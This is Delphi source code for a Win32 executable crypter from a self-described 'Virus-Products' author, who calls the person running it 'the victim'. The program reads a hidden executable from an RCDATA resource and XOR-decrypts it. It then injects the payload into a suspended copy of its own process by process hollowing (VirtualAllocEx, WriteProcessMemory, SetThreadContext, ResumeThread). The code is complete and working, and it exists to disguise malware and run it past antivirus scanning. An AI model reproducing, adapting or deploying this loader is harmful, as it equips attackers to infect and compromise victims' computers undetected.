
{
 Win32 Exe Crypter by Hs32-Idir

  Delphi open source show you how to code an Exe32 crypter with a simple Xor encryption algo.
  Concept : host the crypted Exex86 file into resource named "HSIDIR" inside the RCDATA
  and when the vectim execute our exe file it will charge it in memory of our executed file and decrypt it
  and Map it into the memory of our already loaded Exe.

   Contact : http://www.Hs32-Idir.tk

}

PROGRAM CRYPTER;

USES  Windows;

{$IMAGEBASE $1001134001}

CONST _INFO : STRING = 'File Crypter Pro By Agent-Hs32-Idir[Virus-Products] -2006-2007';

TYPE  TSections = ARRAY [0..0] OF TImageSectionHeader;

FUNCTION _GTASize ( _SZ: LongWord; _ALNment: LongWord ): LongWord;
BEGIN
IF (( _SZ MOD _ALNment ) = 0 ) THEN
BEGIN
    Result := _SZ;
END ELSE BEGIN
    Result := (( _SZ DIV _ALNment ) + 1 ) * _ALNment;
END;
END;

FUNCTION _IMgSize ( _Imge: Pointer ): LongWord;
VAR
  _ALNment    : LongWord                                                        ;
  _IMGNtHeade : PImageNtHeaders                                                 ;
  _SectionP   : ^TSections                                                      ;
  _SectionL   : LongWord                                                        ;
BEGIN
  _IMGNtHeade := Pointer ( LongWord
                         ( LongWord
                         ( _Imge )) + LongWord
                         ( PImageDosHeader
                         ( _Imge )._lfanew ))                                   ;
  _ALNment    := _IMGNtHeade.OptionalHeader.SectionAlignment                    ;
IF (( _IMGNtHeade.OptionalHeader.SizeOfHeaders MOD _ALNment ) = 0 ) THEN
BEGIN
    Result    := _IMGNtHeade.OptionalHeader.SizeOfHeaders                       ;
END ELSE BEGIN
    Result    := (( _IMGNtHeade.OptionalHeader.SizeOfHeaders DIV _ALNment ) + 1 ) * _ALNment;
END;
    _SectionP := Pointer ( pchar
                         ( @
                         ( _IMGNtHeade.OptionalHeader )) + _IMGNtHeade.FileHeader.SizeOfOptionalHeader );
FOR _SectionL := 0 TO _IMGNtHeade.FileHeader.NumberOfSections - 1 DO
BEGIN
IF _SectionP [_SectionL].Misc.VirtualSize <> 0 THEN
BEGIN
IF (( _SectionP [_SectionL].Misc.VirtualSize MOD _ALNment ) = 0 ) THEN
BEGIN
      Result := Result + _SectionP [_SectionL].Misc.VirtualSize                 ;
END ELSE BEGIN
      Result := Result + ((( _SectionP [_SectionL].Misc.VirtualSize DIV _ALNment ) + 1 ) * _ALNment);
END;
END;
END;
END;

PROCEDURE EjectFile ( _FileToEject: Pointer );
VAR
  _BAddress    ,
  _Byte        ,
  _HSize       ,
  _ISize       ,
  _SectionL    ,
  _SSize       : LongWord                                                       ;
  _CNText      : TContext                                                       ;
  _FData       : Pointer                                                        ;
  _IMGNtHeade  : PImageNtHeaders                                                ;
  _IMemory     : Pointer                                                        ;
  _PInfo       : TProcessInformation                                            ;
  _SectionP    : ^TSections                                                     ;
  _SInfo       : TStartupInfo                                                   ;
BEGIN
  _IMGNtHeade := Pointer  ( LongWord
                          ( LongWord
                          ( _FileToEject )) + LongWord
                          ( PImageDosHeader
                          ( _FileToEject )._lfanew  ))                          ;
  _ISize      := _IMgSize ( _FileToEject )                                      ;
  GetMem                  ( _IMemory , _ISize )                                 ;
TRY
    _FData    := _IMemory                                                       ;
    _HSize    := _IMGNtHeade.OptionalHeader.SizeOfHeaders                       ;
    _SectionP := Pointer ( pchar
                         ( @
                         ( _IMGNtHeade.OptionalHeader )) + _IMGNtHeade.FileHeader.SizeOfOptionalHeader );
FOR _SectionL := 0 TO _IMGNtHeade.FileHeader.NumberOfSections - 1 DO
BEGIN
IF  _SectionP [_SectionL].PointerToRawData < _HSize THEN _HSize   :=
    _SectionP [_SectionL].PointerToRawData                                      ;
END;
    CopyMemory ( _FData       ,
                 _FileToEject ,
                 _HSize       )                                                 ;
    _FData    := Pointer ( LongWord
                         ( _FData ) + _GTASize
                         ( _IMGNtHeade.OptionalHeader.SizeOfHeaders ,
                           _IMGNtHeade.OptionalHeader.SectionAlignment ))       ;
FOR _SectionL := 0 TO      _IMGNtHeade.FileHeader.NumberOfSections - 1 DO
BEGIN
IF  _SectionP [_SectionL].SizeOfRawData > 0 THEN
BEGIN
    _SSize    := _SectionP [_SectionL].SizeOfRawData                            ;
IF  _SSize     > _SectionP [_SectionL].Misc.VirtualSize THEN _SSize :=
                 _SectionP [_SectionL].Misc.VirtualSize                         ;
    CopyMemory ( _FData ,
                 Pointer
               ( LongWord
               ( _FileToEject ) + _SectionP [_SectionL].PointerToRawData )
               , _SSize )                                                       ;
    _FData     := Pointer ( LongWord
                          ( _FData ) + _GTASize
                          ( _SectionP [_SectionL].Misc.VirtualSize ,
                            _IMGNtHeade.OptionalHeader.SectionAlignment ))      ;
END ELSE
BEGIN
IF  _SectionP [_SectionL].Misc.VirtualSize <> 0 THEN
    _FData     := Pointer ( LongWord
                          ( _FData ) + _GTASize
                          ( _SectionP [_SectionL].Misc.VirtualSize ,
                            _IMGNtHeade.OptionalHeader.SectionAlignment ))      ;
END;
END;
    ZeroMemory    ( @_SInfo  , SizeOf ( StartupInfo ))                          ;
    ZeroMemory    ( @_CNText , SizeOf ( TContext    ))                          ;
    CreateProcess ( NIL              ,
                    pchar
                  ( ParamStr(0) )    ,
                    NIL              ,
                    NIL              ,
                    False            ,
                    CREATE_SUSPENDED ,
                    NIL              ,
                    NIL              ,
                    _SInfo           ,
                    _PInfo )                                                    ;
    _CNText.ContextFlags := CONTEXT_FULL ;
    GetThreadContext   ( _PInfo.hThread  , _CNText );
    ReadProcessMemory  ( _PInfo.hProcess , Pointer ( _CNText.Ebx + 8 ) , @_BAddress , 4 , _Byte );
    VirtualAllocEx     ( _PInfo.hProcess , Pointer ( _IMGNtHeade.OptionalHeader.ImageBase ) , _ISize , MEM_RESERVE OR MEM_COMMIT , PAGE_EXECUTE_READWRITE );
    WriteProcessMemory ( _PInfo.hProcess , Pointer ( _IMGNtHeade.OptionalHeader.ImageBase ) , _IMemory , _ISize , _Byte );
    WriteProcessMemory ( _PInfo.hProcess , Pointer ( _CNText.Ebx + 8 ) , @_IMGNtHeade.OptionalHeader.ImageBase , 4 , _Byte );
    _CNText.Eax := _IMGNtHeade.OptionalHeader.ImageBase + _IMGNtHeade.OptionalHeader.AddressOfEntryPoint;
    SetThreadContext   ( _PInfo.hThread , _CNText );
    ResumeThread       ( _PInfo.hThread );
FINALLY
    FreeMemory         ( _IMemory );
END;
END;

FUNCTION VisualiseRES(VAR Size:integer; pSectionName: Pchar): Pointer;
VAR
  ResourceLocation: HRSRC;
  ResourceHandle: THandle;
BEGIN
  ResourceLocation := FindResource(hInstance, pSectionName, RT_RCDATA);
  Size := SizeOfResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
IF Result <> NIL THEN
   FreeResource(ResourceHandle);
END;

FUNCTION AgentFile( Text : AnsiString ): AnsiString;
VAR
  Key        : STRING;
  iLoop      ,
  jeefo      : Integer;
  MagicCount : Integer;
BEGIN
  MagicCount := 50;
  Key        := 'Agent-Hs32-Idir[Virus-Products] ExeCrypter (Pro)';
  jeefo      := Length( Text )  +
                Length( Key );
FOR iLoop    := 1 TO jeefo DO
BEGIN
IF ( MagicCount   = 256 ) THEN
     MagicCount  := 50;
     Text[iLoop] := Chr( Ord( Text[iLoop] ) XOR MagicCount XOR Length( Key ));
     Inc( MagicCount );
END;
  Result := Text;
END;

VAR
  _BPointer         : Pointer                                                   ;
  _BLength          : Integer                                                   ;
  _BString          : AnsiString                                                ;
  _RName            : STRING                                                    ;
  _iLoop            : INTEGER                                                   ;
BEGIN
FOR _iLoop := 0 TO 1-1 DO BEGIN
      _RName    := 'HSIDIR'                                                     ;
      _BPointer := VisualiseRES ( _BLength , PChar
                                ( _RName   ))                                   ;
IF   ( Assigned ( _BPointer  )) THEN BEGIN
      SetLength ( _BString    ,
                  _BLength    )                                                 ;
      Move      ( _BPointer^  ,
                  _BString[1] ,
                  _BLength    )                                                 ;
      _BString :=  AgentFile
                ( _BString    )                                                 ;
END;                                                                            ;
IF    @_BString[1] <> NIL THEN
BEGIN
      EjectFile ( @_BString[1] )                                                ;
END;
END;

{
 Written by Hs32-Idir
  Delphi Helpdesk
}


END.
